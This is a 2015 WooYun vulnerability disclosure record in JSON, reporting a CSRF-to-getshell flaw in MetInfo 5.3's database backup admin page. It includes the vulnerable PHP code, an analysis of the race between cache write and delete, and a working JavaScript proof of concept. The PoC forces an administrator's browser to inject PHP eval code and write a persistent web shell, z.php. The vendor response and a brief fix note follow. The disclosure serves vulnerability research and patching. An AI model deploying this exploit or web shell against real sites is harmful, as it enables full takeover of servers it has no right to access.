{"id": 68199, "wybug_id": "wooyun-2015-0131606", "wybug_title": "MetInfo5.3最新版CSRF getshell", "wybug_corp": "MetInfo", "wybug_author": "zhk", "wybug_date": "2015-08-04 17:46", "wybug_open_date": "2015-11-04 13:32", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["代码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-09：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-04：\t细节向公众公开  简要描述： MetInfo5.3最新版CSRF getshell 详细说明：  后台文件./admin/system/database/index.php中，变量$action，$tbl，$tables，$fileid用户可控。问题代码：下面是去除多余代码后的文件。\n<?php...if($action=='allfile'){        ...}elseif($action=='uploadimg'){        ...}elseif($action=='config'){        ...}elseif($action=='allbase'){\t$localurl=\"http://\";\t$localurl.=$_SERVER['HTTP_HOST'].$_SERVER[\"PHP_SELF\"];\t$localurl_a=explode(\"/\",$localurl);\t$localurl_count=count($localurl_a);\t$localurl_admin=$localurl_a[$localurl_count-4];\t$localurl_admin=$localurl_admin.\"/system/database/index\";\t$localurl_real=explode($localurl_admin,$localurl);\t$localurl=$localurl_real[0];\t$fileid = isset($fileid)?$fileid:1;\tif($tbl){\t\t$tables=tableprearray($tablepre);\t\t$sizelimit=2048;\t}else{\t\tforeach($tables as $key=>$val){\t\t\t$tablestx.=$val.'|';\t\t}\t}\tif($fileid==1){\t\t$random =met_rand(6);\t\tcache_write('bakup_tables.php', $tables);\t}elseif(!$tbl){\t\t$allidlist=explode('|',$tablestx);\t\tfor($i=0;$i<count($allidlist)-1;$i++){\t\t\t$tables[$i]=$allidlist[$i];\t\t}\t}\t$sqldump = '';\t$tableid = isset($tableid) ? $tableid - 1 : 0;\t$startfrom = isset($startfrom) ? intval($startfrom) : 0;\t$tablenumber = count($tables);\tfor($i = $tableid; $i < $tablenumber && strlen($sqldump) < $sizelimit * 1000; $i++){\t\t$sqldump .= sql_dumptable($tables[$i], $startfrom, strlen($sqldump));\t\t$startfrom = 0;\t}\tif(trim($sqldump)){\t\t...\t}else{\t\tcache_delete('bakup_tables.php');\t\tmetsave($rurls,$lang_setdbBackupOK,$depth);\t}}...?>\n分析：1. 在第129行`cache_write('bakup_tables.php', $tables);`将$tables直接写入bakup_tables.php。2. 但在第120行`$tables=tableprearray($tablepre);`，为了跳过120行，给$tbl赋值0。3. 由于我们自定义了$tables，第144行if(trim($sqldump))为false，将会执行165行的`cache_delete('bakup_tables.php');`。4. 第120行生成，165删除，中间几行执行时间让我们有机会去执行bakup_tables.php。5. 如果自己测试，我们可以多线程访问bakup_tables.php来触发恶意代码。6. 但在实际情况中，CSRF触发时间不确定（不确定管理什么时候访问），我们需则要管理员访问`./admin/system/database/index.php`的同时，帮我们执行`./admin/databack/bakup_tables.php`。POC：成功可访问http://www.xxx.com/admin/databack/z.php?1=phpinfo();\n<script>var url='http://www.xxx.com/';for(var k=0; k<500; k++){        document.write('<script src=\\''+url+'/admin/system/database/index.php?action=allbase&tbl=0&tables=1<?php eval($_REQUEST[1]);?>&fileid=1&r='+Math.random()+'\\'><\\/script>');        document.write('<script src=\\''+url+'/admin/databack/bakup_tables.php?1=file_put_contents(\"z.php\",%27<?php%20eval($_REQUEST[1]);?>%27);&r='+Math.random()+'\\'><\\/script>');        document.write('<script src=\\''+url+'/admin/system/database/index.php?action=allbase&tbl=0&tables=1<?php eval($_REQUEST[1]);?>&fileid=1&r='+Math.random()+'\\'><\\/script>');        document.write('<script src=\\''+url+'/admin/databack/bakup_tables.php?1=file_put_contents(\"z.php\",%27<?php%20eval($_REQUEST[1]);?>%27);&r='+Math.random()+'\\'><\\/script>');}</script>\n   漏洞证明：  1. 本地搭建测试环境:http://localhost/fuzz/MetInfo5.3/并登录后台。\n\n2. 目前./admin/databack目录下的文件。\n\n3. 执行POC(http://localhost/fuzz/p.html)，模拟管理员访问我们的网页。调式工具中可见有bakup_tables.php是访问成功的\n\n4. 现在./admin/databack目录下的文件，出现了我们的后门z.php\n\n5. 访问z.php\n\n   修复方案：  变量初始化   版权声明：转载请注明来源 zhk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-08-06 13:31 厂商回复： 是系统BUG，后续版本修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}